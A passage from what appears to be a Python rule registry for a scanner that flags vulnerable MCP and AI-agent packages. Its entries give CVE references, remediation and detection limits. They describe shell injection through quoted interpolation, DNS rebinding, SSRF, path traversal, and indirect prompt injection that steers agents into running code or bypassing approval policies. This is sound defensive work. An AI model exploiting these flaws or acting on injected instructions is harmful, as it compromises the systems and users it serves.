    "`schema.py` when a component is converted into a LangChain tool through "
    "`ComponentToolkit.get_tools()`, a custom-component save through the API "
    "included, so an option object with a crafted `__repr__` runs code "
    "(GHSA-33p4-w7j3-33mw). Treat < 1.12.0 (and unpinned) as exposed; 1.11.6 is "
    "exposed to that one alone. Three more advisories sit under that floor: "
    "CVE-2026-105697 (CVSS 9.9) and CVE-2026-105740 (CVSS 9.9), the MCP stdio "
    "transport running a configured command through `bash -c` with no allowlist "
    "(fixed in 1.10.3 and 1.9.0), and CVE-2026-105741 (CVSS 7.1), a spoofed "
    "`X-Forwarded-For` on the MCP-config install endpoint from 1.5.0 (fixed in "
    "1.10.3). So does CVE-2026-105699 (CVSS 4.0 7.1): from 1.6.8, a project-scoped "
    "MCP connection's `resources/read` returned another user's flow files without "
    "checking that the flow belonged to the caller (fixed in 1.9.1). The same code "
    "ships as `langflow-base` and `lfx`, which reach 1.12.0 "
    "in the same release, so both are read at the same floor. Pre-1.0.0 releases "
    "of `langflow` predate the MCP stdio launcher and are not in the affected range.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `langflow` (or `langflow-base` / `lfx`, where those are installed "
    "directly) to >= 1.12.0 and pin it. Do not pass an attacker-influenced "
    "environment through to a launched stdio MCP server; blocklist (or, better, "
    "allowlist) the process environment, including `SHELLOPTS`/`BASHOPTS`/`PS4`. "
    "Derive the client address from the socket, not from a caller-supplied "
    "`X-Forwarded-For` header, when gating localhost-only operations.",
    sarif_name="LangflowMcpStdioEnvInjectionRce",
    cve_references=[
        "CVE-2026-12940", "CVE-2026-17623", "CVE-2026-17626",
        "CVE-2026-8446", "CVE-2026-9077", "CVE-2026-7646", "CVE-2026-9186",
        "CVE-2026-85025", "CVE-2026-78575", "CVE-2026-81941", "CVE-2026-101861",
        "CVE-2026-105697", "CVE-2026-105740", "CVE-2026-105741", "CVE-2026-105699",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `langflow`, `langflow-base` and `lfx` in requirements*.txt at any "
        "depth and, at the project root only, in pyproject.toml, Pipfile, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock and "
        "uv.lock lockfiles, reporting a range that admits an affected version and a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`) or in "
        "a lockfile format the reader does not parse (`pdm.lock`). A compose file's "
        "`langflowai/langflow` image tag is not read. A file over 2 MB, or a "
        "lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-GEMINIBRIDGE-CVE-2026-54785-001",
    "gemini-bridge tool-argument path traversal reads arbitrary files (1.0.0–<1.3.1)",
    "The `gemini-bridge` MCP server (PyPI) from 1.0.0 through 1.3.0 has a path "
    "traversal in `consult_gemini_with_files`: in inline mode it reads any file "
    "path supplied in the `files` argument without confining it to the working "
    "directory, then forwards the contents to the Gemini CLI — so a caller can "
    "exfiltrate arbitrary files the server process can read (CVE-2026-54785, "
    "CVSS 6.2). Fixed in 1.3.1; treat 1.0.0–1.3.0 (and unpinned) as exposed. The "
    "npm `gemini-bridge` (0.1.x) is an unrelated package below the affected range.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `gemini-bridge` to >= 1.3.1 and pin it. Confine tool-supplied file "
    "paths to the working directory (resolve and containment-check every path "
    "before reading) rather than reading whatever the caller names.",
    sarif_name="GeminiBridgePathTraversal",
    cve_references=["CVE-2026-54785"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `gemini-bridge` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, reporting a "
        "range that admits an affected version and a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# MCP sidecar HTTP surface (2026-08 wave) — the "dashboard next to the tools"
# class. Three advisories in one week, one shape: the MCP server also binds a
# local HTTP dashboard, and the dashboard has no auth because "it only listens
# on localhost". AAK already carries four package-specific pins of this exact
# shape (Serena CVE-2026-49471, Cline CVE-2026-59723, claude-code-templates
# CVE-2026-73222, Penpot CVE-2026-45805); these two rules detect the pattern.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SIDECAR-NOAUTH-001",
    "MCP server binds an unauthenticated sidecar HTTP surface",
    "A process that registers MCP tools also binds an HTTP listener whose "
    "routes carry no authentication dependency or middleware (CWE-306, Missing "
    "Authentication for a Critical Function). The MCP transport itself may be "
    "authenticated or stdio-only, but the sidecar dashboard / status API / "
    "debug UI beside it is not, and it is backed by the same process state and "
    "the same operator credentials. Binding to loopback is not an "
    "authorization boundary: the listener is reachable by DNS rebinding from "
    "any page the operator visits, and by any co-located SSRF on the host. "
    "Distinct from `AAK-MCP-HTTP-NOAUTH-SERVER-001`, which covers the MCP "
    "endpoint itself bound to a non-loopback interface or serving wildcard "
    "CORS; this rule covers the *second* listener, on loopback, that the "
    "threat model forgot.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Put authentication on the sidecar's routes, not just on the MCP "
    "transport. A bearer token or API-key header checked in middleware is "
    "enough, and unlike a loopback bind it also survives DNS rebinding. If the "
    "surface exists only for local debugging, gate it behind an explicit "
    "opt-in flag that is off by default.",
    sarif_name="McpSidecarNoAuth",
    cve_references=["CVE-2026-55156", "CVE-2026-49471", "CVE-2026-73222"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-MCP-03"],
    incident_references=["GHSA-76pc-mqxp-3rq5", "GHSA-rm43-82j9-r4mj"],
    limitations="Detects the listener and the absence of an auth marker in the "
    "same file. An auth check applied from a separate middleware module that "
    "this file never references will read as absent.",
)

_r(
    "AAK-MCP-SIDECAR-REBIND-001",
    "Loopback bind used as access control with no Host-header allow-list",
    "An HTTP listener beside an MCP server binds 127.0.0.1 / ::1 and relies on "
    "that bind as its access control, with no Host-header allow-list (CWE-350, "
    "Reliance on Reverse DNS Resolution). This is the DNS-rebinding "
    "precondition: an attacker page resolves its own hostname to a public IP, "
    "then re-resolves it to 127.0.0.1, and the browser delivers the request to "
    "the loopback listener with an attacker-chosen Host header. The bind "
    "address never enters into it, because the packet genuinely does arrive on "
    "loopback. Only a Host-header allow-list rejects it. Suppressed when the "
    "app enforces request-borne credentials (bearer token, API-key header), "
    "which a rebinding attacker cannot supply; not suppressed by cookie or "
    "session auth, which the browser attaches on the attacker's behalf. "
    "Complements `AAK-DNS-REBIND-001`, which owns the MCP SDK's own "
    "StreamableHTTP transport; this rule stands down on those.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Add a Host-header allow-list to the listener — FastAPI/Starlette's "
    "TrustedHostMiddleware, or an equivalent check that rejects any Host not "
    "in {localhost, 127.0.0.1, ::1}. Keep the loopback bind, but stop treating "
    "it as the control.",
    sarif_name="McpSidecarRebind",
    cve_references=["CVE-2026-55156", "CVE-2026-49471"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-MCP-03"],
    incident_references=["GHSA-76pc-mqxp-3rq5"],
    limitations="Detects a literal loopback bind. A bind address read from "
    "config at runtime is not resolved, so a server that defaults to loopback "
    "via a settings object will not be flagged.",
)


# ---------------------------------------------------------------------------
# Shell interpolation precision (2026-08 wave)
#
# `AAK-TAINT-001` fires only when a bare parameter is passed straight to the
# sink. Both August CVSS-8.4 advisories build a command string first, and both
# quote the interpolation site — which stops nothing, because $(...) and
# backticks expand inside double quotes.
# ---------------------------------------------------------------------------

_r(
    "AAK-SHELL-QUOTED-INTERP-001",
    "Tool argument interpolated into a shell command, quoting notwithstanding",
    "An agent/tool parameter reaches a shell-executing sink through an "
    "interpolated command string (CWE-78), including via a local variable and "
    "including when the interpolation site is quoted. Double quotes are not a "
    "mitigation: `$(...)`, backticks and `${...}` all expand inside them, so "
    "`getent passwd \"${username}\"` is exactly as injectable as the unquoted "
    "form — that is CVE-2026-55157 (CVSS 3.1 8.4). Single quotes do block "
    "substitution but not a literal `'` that closes the quoting. The rule also "
    "covers the argv-behind-an-eval-flag form: passing a list instead of a "
    "shell string stops shell metacharacters, but not injection into an "
    "interpreter you explicitly invoked, which is how CVE-2026-55071 (CVSS 3.1 "
    "8.4) reached the OS through Stata's own shell escape. In JavaScript and "
    "TypeScript it also follows one call into another file: a tool handler "
    "passes a tool-argument value to a method defined in another file, and "
    "that method interpolates the parameter into the command. That is "
    "CVE-2026-94031, where nexus-mcp's `nexus_reauth` handler handed its `url` "
    "argument to a method that ran `open \"${loginUrl}\"` through `exec`. "
    "Narrower and more precise than `AAK-TAINT-001`, which only matches a bare "
    "parameter handed straight to the sink.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Do not build the command as a string. Pass an argv list with no shell, "
    "and if an element must carry a value, escape it with `shlex.quote` "
    "(Python) or the `shell-quote` package (Node). Where the argv element is "
    "itself a program for an interpreter, validate the value against an "
    "allow-list — quoting the outer shell does nothing for the inner one.",
    sarif_name="ShellQuotedInterpolation",
    cve_references=["CVE-2026-55157", "CVE-2026-55071", "CVE-2026-94031"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-TOOL-02"],
    incident_references=["GHSA-49mq-fc6q-3h46", "GHSA-49m4-vp58-wgc9"],
    limitations="Propagation is one hop: a parameter interpolated into a local "
    "variable that is then passed to the sink. In JavaScript and TypeScript it "
    "also follows one call from a tool handler into a method defined in another "
    "file, matched by name, not type: a same-named method elsewhere can be "
    "matched, and a value routed through two helpers is not followed. Python "
    "does not follow calls into other modules.",
)

_r(
    "AAK-SHELL-DEFAULT-PROFILE-001",
    "Command-executing tool is reachable in the default tool profile",
    "A tool that reaches a command-execution sink is registered in the "
    "server's default profile, with no opt-in flag, environment gate, or "
    "profile membership standing between a freshly connected MCP client and "
    "the sink. This is the condition that moved both August 2026 shell CVEs "
    "from theoretical to high: no non-default configuration was needed, which "
    "is what the `PR:N` in their CVSS vectors records. Fires only for tools "
    "that already reach a command sink, so it qualifies a real finding rather "
    "than complaining about every server that runs commands.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Move command-executing tools behind an explicit opt-in — an "
    "`AAK_ENABLE_*` environment gate, a named non-default tool profile, or a "
    "CLI flag — so that reaching the sink requires a deliberate operator "
    "decision rather than the default install.",
    sarif_name="ShellToolDefaultProfile",
    cve_references=["CVE-2026-55157", "CVE-2026-55071"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-TOOL-02"],
    incident_references=["GHSA-49mq-fc6q-3h46", "GHSA-49m4-vp58-wgc9"],
    limitations="Reads the registration site in the same file as the tool. A "
    "gate applied by a loader in another module is not seen.",
)


# ---------------------------------------------------------------------------
# Internal / meta rules (surfaced when the scanner itself has a problem)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-FLORENCE2-CVE-2026-19984-001",
    "mcp-florence2 SSRF via the get_images src argument (<= 0.3.13, no code fix planned)",
    "`mcp-florence2` up to and including 0.3.13 has server-side request forgery in "
    "`get_images` (`src/mcp_florence2/__init__.py`): the `src` argument is fetched "
    "without validating the host or scheme, so a caller — or an indirect prompt "
    "injection reaching this tool — can steer the server at attacker-chosen internal "
    "endpoints (cloud metadata, loopback admin ports, RFC-1918 hosts) "
    "(CVE-2026-19984, CVSS 3.1 6.3). A public exploit exists. This is a "
    "**presence-only** pin, and for a different reason than the other no-fix pins: "
    "the vendor has ruled out a source change, stating that deployments needing SSRF "
    "protection should route HTTP(S) through an SSRF-safe proxy \"without requiring "
    "changes to the mcp-florence2 source code\". So there is no fixed version to wait "
    "for, and a future release does not clear this finding — the mitigation is "
    "deployment-side. Same SSRF-via-tool-argument shape as the "
    "`@adenot/mcp-google-search` `read_webpage` pin.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Put the server's egress behind a proxy or allow-list that refuses loopback, "
    "link-local, cloud-metadata and RFC-1918 destinations — that is the vendor's own "
    "stated mitigation and the only one that addresses this. Do not wait for a version "
    "bump: the vendor has said the fix will not be in the package, so upgrading "
    "`mcp-florence2` does not resolve it. If you control the deployment, validate the "
    "`src` scheme and host before the fetch, or drop the `get_images` tool from the "
    "exposed tool set if callers do not need remote image input. Upstream has stated "
    "the fix will not ship in the package, so treat this as a standing deployment "
    "control rather than a pending upgrade.",
    sarif_name="McpFlorence2GetImagesSsrf",
    cve_references=["CVE-2026-19984"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `mcp-florence2` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, and reports "
        "every version, a future fixed one included, until the pin gets a floor. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-CODEWHALE-CVE-2026-75858-001",
    "CodeWhale auto-approved code execution: rlm_eval and exec_shell_interact "
    "bypass the approval policy (`codewhale` >= 0.8.41, < 0.8.64)",
    "CodeWhale between 0.8.41 and 0.8.64 ships two tools whose "
    "`approval_requirement()` returns `ApprovalRequirement::Auto`, which the engine "
    "treats as \"never prompt\". That silently overrides the user's configured "
    "`--approval-policy` for the two tool classes it should never be overridden for. "
    "`rlm_eval` runs model-supplied Python in a `python3` interpreter with no prompt "
    "and no audit step (CVE-2026-75858, CVSS 7.8, CWE-94); `exec_shell_interact` "
    "(alias `exec_interact`) writes LLM-controlled stdin into an already-approved "
    "long-running interactive session — a `python3 -i` REPL, `mysql`, `ssh`, or "
    "`sudo -i` — so commands run at that process's privilege level (CVE-2026-75857, "
    "CVSS 7.0). Neither needs a malicious operator: prompt injection in any untrusted "
    "content the agent reads (a fetched page, a repository file, an MCP tool result) "
    "reaches both, and the companion `rlm_open` tool can stage exactly that content. "
    "Both are fixed in 0.8.64. `deepseek-tui` is the same project before it was "
    "renamed and is carried by both advisories; it is deprecated on npm in favour of "
    "`codewhale`, so it has no fixed release of its own.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `codewhale` to >= 0.8.64 and pin it. If the manifest still names "
    "`deepseek-tui`, that package is deprecated and its line ends before the fix: "
    "migrate to `codewhale` >= 0.8.64 rather than upgrading in place. Until then, "
    "treat any approval policy you have configured as not in force for `rlm_eval` or "
    "`exec_shell_interact` and remove those tools from the exposed tool set, since a "
    "policy the engine never consults offers no protection.",
    sarif_name="CodeWhaleAutoApprovedExecution",
    cve_references=["CVE-2026-75858", "CVE-2026-75857"],
    owasp_mcp_references=["MCP02:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `codewhale` and `deepseek-tui`, each against its own fix floor, in "
        "requirements*.txt at any depth and, at the project root only, in "
        "pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). Cargo manifests are not read, so "
        "the crates.io crate `codewhale-tui`, which has the same defect, is not "
        "reported. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-MARIMO-CVE-2026-75149-001",
    "marimo launches a notebook-supplied MCP server command on open (< 0.23.15)",
    "`marimo` before 0.23.15 has code injection in the notebook configuration "
    "handler: a notebook can embed an MCP server entry whose `command` value is "
    "attacker-controlled, and opening that notebook in edit mode launches the "
    "command as a local subprocess before any cell executes and without "
    "authentication (CVE-2026-75149, CVSS 3.1 8.8, CWE-94). Cloning a repository "
    "and opening the notebook is the whole exploit. This is the stdio-launcher "
    "shape `AAK-MCP-STDIO-LAUNCHER-INJECT-001` already describes, arriving through "
    "a notebook file rather than an MCP config, which is why it needs a pin: the "
    "config scanners never open a `.py` notebook. Fixed in 0.23.15. The floor "
    "carries no lower bound because two further pip-ecosystem marimo advisories "
    "record `< 0.23.0` (pre-auth RCE) and `< 0.23.9` (reflected XSS), so anything "
    "below this floor is exposed to something.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `marimo` to >= 0.23.15 and pin it. Until then, do not open untrusted "
    "notebooks in edit mode: the subprocess launches before any cell runs, so "
    "reviewing the cells first does not protect you. Treat a notebook from an "
    "untrusted repository as executable content, not as a document.",
    sarif_name="MarimoNotebookMcpCommandInjection",
    cve_references=["CVE-2026-75149"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `marimo` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`) or in "
        "a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-OMNIGENT-CVE-2026-62674-001",
    "Omnigent shared-agent swap injects a stdio MCP command (< 0.3.0)",
    "`omnigent` before 0.3.0 checks `LEVEL_EDIT` on the session in "
    "`PUT /sessions/{session_id}/agent` but never rejects a bound shared or "
    "template agent whose `agent.session_id` is `None`. An authenticated user "
    "with edit access to one session can therefore replace that shared agent "
    "bundle through `omnigent/server/routes/sessions.py`, attach a stdio MCP "
    "server, and have every later session that uses the shared agent launch an "
    "attacker-chosen command through `omnigent/tools/mcp.py`, running with the "
    "Omnigent runner's privileges (CVE-2026-62674, CVSS 3.1 9.0, CWE-94). The "
    "blast radius is the point: the injection is written once into shared state "
    "and executes for every consumer of it afterwards. Fixed in 0.3.0.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `omnigent` to >= 0.3.0 and pin it. Because the payload persists in a "
    "shared agent bundle rather than in a single session, upgrading does not undo "
    "an injection that already landed: audit shared and template agents for stdio "
    "MCP server entries you did not add, and treat session edit rights as "
    "equivalent to shared-agent edit rights until you are past 0.3.0.",
    sarif_name="OmnigentSharedAgentMcpInjection",
    cve_references=["CVE-2026-62674"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `omnigent` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`) or in "
        "a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-NEOMJS-CVE-2026-18482-001",
    "Neo.mjs file-system MCP server shell injection (no released fix yet)",
    "`neo.mjs` has command injection in `FileSystemService.mjs` of the "
    "`ai/mcp/server/file-system` MCP server: `checkSyntax()` and "
    "`runPlaywrightTest()` interpolate a caller-controlled `absolutePath` into a "
    "shell command, so an agent induced to call either tool reaches arbitrary OS "
    "command execution (CVE-2026-18482). This is a **presence-only** pin because "
    "there is nothing to pin to: the fix is commit `88c77fc` dated 2026-08-11, and "
    "no `neo.mjs` release has been published since 13.1.0 on 2026-07-03 on either "
    "npm or GitHub releases. Every published version is therefore affected. Unlike "
    "the `mcp-florence2` pin, this is a placeholder rather than a permanent state: "
    "upstream has written the fix and simply not shipped it, so this becomes a "
    "version floor the day a release containing that commit appears.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "There is no fixed release to upgrade to yet, so do not treat a version bump as "
    "the mitigation. Remove the `ai/mcp/server/file-system` server from the exposed "
    "tool set, or vendor the fix from commit `88c77fc` if you build from source. If "
    "the tools must stay reachable, ensure `absolutePath` cannot carry shell "
    "metacharacters by passing it as an argv element rather than interpolating it "
    "into a command string. Re-pin to a version floor once upstream publishes a "
    "release containing the fix.",
    sarif_name="NeoMjsFileSystemMcpShellInjection",
    cve_references=["CVE-2026-18482"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `neo.mjs` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, and reports "
        "every version, a future fixed one included, until the pin gets a floor. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`) or in a lockfile format the reader does not "
        "parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)

_r(
    "AAK-MCP-LANGBOT-CVE-2026-54449-001",
    "LangBot lets any authenticated user configure an STDIO MCP command (no fix)",
    "LangBot at 4.10.7 and earlier applies no adequate authorization boundary to "
    "the Extensions MCP configuration: in "
    "`src/langbot/pkg/provider/tools/loaders/mcp.py`, `StdioServerParameters` takes "
    "the configured command and arguments and starts a server-side subprocess, so "
    "anyone who can sign up or obtain an account executes arbitrary commands with "
    "the privileges of the LangBot service (CVE-2026-54449, CVSS 3.1 8.8). This is "
    "a **presence-only** pin because no fix exists: "
    "[GHSA-3pvh-63gf-j9mw](https://github.com/advisories/GHSA-3pvh-63gf-j9mw) "
    "records no patched version, NVD states none is available, and 4.10.8 -- "
    "published 31 minutes after the advisory -- is a media-delivery patch whose "
    "release notes claim no security fix. Treat every published version as exposed "
    "until upstream states otherwise.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "No upgrade resolves this, so do not wait for one. Close the account boundary "
    "instead: disable open sign-up, and restrict the Extensions MCP configuration "
    "surface to operators rather than any authenticated user. If the deployment "
    "cannot enforce that, take the STDIO MCP configuration path out of the reachable "
    "UI, since the subprocess runs with the service's own privileges. Re-pin to a "
    "version floor once upstream ships a release that states it fixes this.",
    sarif_name="LangBotStdioMcpAuthzBypass",
    cve_references=["CVE-2026-54449"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `langbot` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, and reports "
        "every version, a future fixed one included, until the pin gets a floor. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`services/api/pyproject.toml`) or in a lockfile format the reader does not "
        "parse (`pdm.lock`). A compose file's `rockchin/langbot` image tag is not "
        "read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-08-26 wave. Thirteen watcher-filed CVEs triaged; five resolve to an
# artifact published where the pin detector looks. The rest are recorded out of
# scope or already covered in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-QWED-CVE-2026-55546-001",
    "QWED-MCP evaluates a tool argument through SymPy parse_expr (< 0.2.1)",
    "QWED-MCP, a deterministic verification gateway for MCP, before 0.2.1 passes "
    "the attacker-controlled `expression` and `claimed_result` arguments of "
    "`verify_math_expression()` (`src/qwed_mcp/engines/math_engine.py`) straight "
    "into SymPy's `parse_expr()` after only rewriting `^` to `**`. No "
    "`global_dict`/`local_dict` pinning, no removal of builtins and no AST "
    "validation, and `parse_expr()` evaluates through `eval()`, so a tool call "
    "reaches arbitrary code execution with the server's privileges "
    "(CVE-2026-55546, CWE-94, CVSS 3.1 9.8). Fixed in 0.2.1. The *source shape* "
    "of this defect is already reported by `AAK-MCP-TOOL-UNSAFE-EVAL-001`, which "
    "names unpinned `parse_expr` explicitly and fires on this handler; this pin "
    "adds the dependency surface, so a project that consumes the package without "
    "vendoring its source is covered too.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `qwed-mcp` to >= 0.2.1 and pin it. If you maintain a comparable "
    "verifier, do not reach for a denylist of dangerous names: call "
    "`parse_expr(expr, global_dict={}, local_dict=<allowed symbols>, "
    "evaluate=True)` with an explicit symbol allow-list, and bound input length "
    "and character set before parsing.",
    sarif_name="QwedMcpParseExprRce",
    cve_references=["CVE-2026-55546"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-04"],
    limitations=(
        "Reads `qwed-mcp` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-NEXTCLOUD-CVE-2026-55640-001",
    "Nextcloud MCP Server webhook endpoint is unauthenticated by default (< 0.117.2)",
    "Nextcloud MCP Server before 0.117.2 exposes `POST /webhooks/nextcloud` "
    "(`nextcloud_mcp_server/vector/webhook_receiver.py`) with no authentication "
    "unless an operator sets one: `WEBHOOK_SECRET` defaults to `None` and startup "
    "validation does not require it, so `handle_nextcloud_webhook()` accepts "
    "unauthenticated requests in a default deployment (CVE-2026-55640, CWE-306, "
    "CVSS 3.1 9.1). This is the fail-open-by-default shape rather than a missing "
    "check: the code has a secret, and the default value disables it.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `nextcloud-mcp-server` to >= 0.117.2 and pin it. Until then set "
    "`WEBHOOK_SECRET` explicitly and keep the webhook path off any untrusted "
    "network. The durable fix in your own servers is to fail startup when a "
    "required secret is unset rather than defaulting it to `None` -- an optional "
    "secret is an optional control.",
    sarif_name="NextcloudMcpWebhookNoAuth",
    cve_references=["CVE-2026-55640"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `nextcloud-mcp-server` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-BROWSEMCP-CVE-2026-55557-001",
    "browse-mcp writes fetched content to a caller-controlled path (< 0.8.2)",
    "browse-mcp, a Playwright-based headless-browser MCP server, before 0.8.2 has "
    "`browser_download` write a fetched response body to `join(save_dir, filename)` "
    "without validating the caller-supplied `save_dir`, while `browser_save_state` "
    "and `browser_load_state` honour a caller-supplied path unchanged "
    "(CVE-2026-55557). An MCP client -- or an autonomous agent steered by indirect "
    "prompt injection, which is the realistic path -- writes outside the intended "
    "directory. Fixed in 0.8.2. The pinned artifact is the **npm** package "
    "(`That1Drifter/browse-mcp`); PyPI carries an unrelated `browse-mcp` (an "
    "academic-paper search server) whose 0.1.x line never approaches this floor.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `browse-mcp` to >= 0.8.2 and pin it. For a comparable download tool, "
    "resolve the destination and require it to stay under a fixed root "
    "(`os.path.realpath` / `Path.resolve()` then a containment check) rather than "
    "filtering the path string -- and treat the filename as untrusted too.",
    sarif_name="BrowseMcpPathTraversal",
    cve_references=["CVE-2026-55557"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
